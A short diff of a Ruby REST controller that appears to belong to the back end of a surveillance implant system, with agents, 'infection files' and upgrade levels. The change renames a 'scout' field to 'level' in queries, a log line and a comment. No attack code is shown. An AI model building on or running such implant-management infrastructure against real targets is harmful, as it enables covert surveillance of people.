@@ -18,7 +18,7 @@ class AgentController < RESTController
 
     mongoid_query do
       fields = ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled",
-                "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device",
+                "upgradable", "demo", "level", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device",
                 "stat.source", "stat.size", "stat.grid_size"]
 
       fields = fields.inject({}) { |h, f| h[f] = 1; h }
@@ -33,7 +33,7 @@ class AgentController < RESTController
     require_auth_level :tech, :view
 
     mongoid_query do
-      ag = ::Item.where(_id: @params['_id'], deleted: false).in(user_ids: [@session.user[:_id]]).only("name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "good", "version", "counter", "configs")
+      ag = ::Item.where(_id: @params['_id'], deleted: false).in(user_ids: [@session.user[:_id]]).only("name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "level", "good", "version", "counter", "configs")
       agent = ag.first
       return not_found if agent.nil?
       ok(agent)
@@ -310,7 +310,7 @@ class AgentController < RESTController
 
     # yes it is, return the status
     unless agent.nil?
-      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, scout: #{level}, good: #{agent[:good]})"
+      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, level: #{level}, good: #{agent[:good]})"
 
       # if the agent was queued, but now we have a license, use it and set the status to open
       # a demo agent will never be queued
@@ -328,7 +328,7 @@ class AgentController < RESTController
         agent.add_infection_files if agent.platform == 'windows'
       end
 
-      # update the scout flag
+      # update the level
       if agent.level != level
         agent.level = level
         agent.save
